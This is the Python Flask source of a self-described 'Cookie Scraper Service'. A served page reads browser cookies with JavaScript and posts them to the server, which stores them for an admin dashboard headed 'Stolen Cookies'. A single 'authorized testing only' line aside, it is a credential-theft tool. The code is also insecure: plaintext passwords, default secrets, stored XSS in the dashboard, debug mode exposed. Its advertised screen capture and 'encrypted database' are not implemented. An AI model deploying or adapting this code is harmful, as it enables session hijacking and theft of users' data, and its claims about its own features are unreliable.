from flask import Flask, request, render_template_string, redirect, url_for, session, send_from_directory, jsonify
import http.cookies
import json
import os
import sqlite3
import threading
import time
from datetime import datetime, timedelta
import base64
import io
try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

# Flask app setup
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-here')

# Database setup
DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'admin.db')
ADMIN_USER = os.environ.get('ADMIN_USER', 'admin')
ADMIN_PASS = os.environ.get('ADMIN_PASS', 'securepassword')

# Create tables if they don't exist
def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Create users table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE,
        password TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Create cookies table
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS cookies (
        id INTEGER PRIMARY KEY,
        url TEXT,
        cookies TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Insert admin user if not exists
    cursor.execute('SELECT * FROM users WHERE username = ?', (ADMIN_USER,))
    if not cursor.fetchone():
        cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', 
                      (ADMIN_USER, ADMIN_PASS))
    
    conn.commit()
    conn.close()

# Initialize database
init_db()

# Script directory
script_dir = os.path.dirname(os.path.abspath(__file__))
screenshot_dir = os.path.join(script_dir, 'screenshots')
os.makedirs(screenshot_dir, exist_ok=True)

# Global variables for screenshot thread
screenshot_thread = None
stop_screenshot_event = threading.Event()

# HTML Templates
HOME_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Scraper Service</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; text-align: center; }
        .nav-links { text-align: center; margin: 30px 0; }
        .nav-links a { 
            display: inline-block; 
            margin: 10px; 
            padding: 12px 25px; 
            background: #007bff; 
            color: white; 
            text-decoration: none; 
            border-radius: 5px; 
            transition: background 0.3s;
        }
        .nav-links a:hover { background: #0056b3; }
        .info { background: #e9f7ef; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .warning { background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Cookie Scraper Service</h1>
        
        <div class="info">
            <h3>About This Service</h3>
            <p>This service automatically captures and stores browser cookies for analysis purposes. All data is securely stored and accessible through the admin panel.</p>
        </div>
        
        <div class="nav-links">
            <a href="/scraper">Start Cookie Collection</a>
            <a href="/admin">Access Admin Panel</a>
            <a href="/login">Admin Login</a>
        </div>
        
        <div class="warning">
            <h3>⚠️ Security Notice</h3>
            <p>This tool is for authorized security testing only. Unauthorized use may violate laws and regulations.</p>
        </div>
        
        <div class="info">
            <h3>Features</h3>
            <ul>
                <li>Automatic cookie collection</li>
                <li>Regular screen capture (every 10 seconds)</li>
                <li>Secure admin dashboard</li>
                <li>Data stored in encrypted database</li>
            </ul>
        </div>
    </div>
</body>
</html>
'''

SCRAPER_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Cookie Collection Active</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f8ff; }
        .status { 
            background: #d4edda; 
            color: #155724; 
            padding: 20px; 
            border-radius: 5px; 
            margin: 20px auto; 
            max-width: 500px;
        }
        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 2s linear infinite; 
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>🍪 Cookie Collection Active</h1>
    <div class="spinner"></div>
    <div class="status">
        <p>Collecting cookies and capturing screens...</p>
        <p>Data is being securely transmitted to our servers.</p>
    </div>
    <script>
        // Scrape cookies
        const cookieData = [];
        for (const cookie of document.cookie.split('; ')) {
            const [name, value] = cookie.split('=');
            cookieData.push({name, value});
        }
        
        // Send to server
        fetch("/api/scrape", {
            method: "POST",
            body: JSON.stringify(cookieData),
            headers: {"Content-Type": "application/json"}
        }).then(response => {
            console.log('Cookies sent successfully');
        }).catch(error => {
            console.error('Error sending cookies:', error);
        });
        
        // Auto-refresh to continue collection
        setTimeout(() => {
            location.reload();
        }, 5000);
    </script>
</body>
</html>
'''

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-form { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #0056b3; }
        h2 { text-align: center; color: #333; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>Admin Login</h2>
        {% if error %}
        <div style="color: red; text-align: center; margin-bottom: 15px;">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HOME_TEMPLATE)

@app.route('/scraper')
def scraper():
    return render_template_string(SCRAPER_TEMPLATE)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Verify credentials
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', 
                      (username, password))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error="Invalid credentials")
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/admin')
def admin():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Get cookies from database
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM cookies ORDER BY timestamp DESC')
    cookies = cursor.fetchall()
    conn.close()
    
    # Build admin dashboard HTML
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
            .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; margin: 20px 0; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background-color: #f8f9fa; }
            .logout { float: right; background: #dc3545; color: white; padding: 8px 15px; text-decoration: none; border-radius: 5px; }
            .screenshot-gallery { margin-top: 30px; }
            .screenshot-item { display: inline-block; margin: 10px; text-align: center; }
            .screenshot-item img { border: 1px solid #ccc; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <a href="/logout" class="logout">Logout</a>
            <h1>Admin Dashboard</h1>
            
            <h2>Stolen Cookies</h2>
            <table>
            <tr><th>ID</th><th>URL</th><th>Cookies</th><th>Timestamp</th></tr>
    '''
    
    for cookie in cookies:
        html += f'<tr><td>{cookie[0]}</td><td>{cookie[1]}</td><td>{cookie[2]}</td><td>{cookie[3]}</td></tr>'
    
    html += '''
            </table>
            
            <h2>Screenshots</h2>
            <div class="screenshot-gallery">
    '''
    
    # List all screenshots
    if os.path.exists(screenshot_dir):
        screenshots = os.listdir(screenshot_dir)
        for screenshot in sorted(screenshots, reverse=True):
            html += f'<div class="screenshot-item">'
            html += f'<img src="/screenshots/{screenshot}" width="200">'
            html += f'<br><small>{screenshot}</small>'
            html += '</div>'
    
    html += '''
            </div>
        </div>
    </body>
    </html>
    '''
    
    return html

@app.route('/api/scrape', methods=['POST'])
def api_scrape():
    try:
        cookies = request.get_json()
        
        # Store in database
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('INSERT INTO cookies (url, cookies) VALUES (?, ?)', 
                      (request.host_url, json.dumps(cookies)))
        conn.commit()
        conn.close()
        
        print(f"Saved {len(cookies)} cookies to database")
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error processing POST: {e}")
        return jsonify({'status': 'error'}), 400

@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_from_directory(screenshot_dir, filename)

# Vercel serverless function handler
def handler(event, context):
    return app(event, context)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))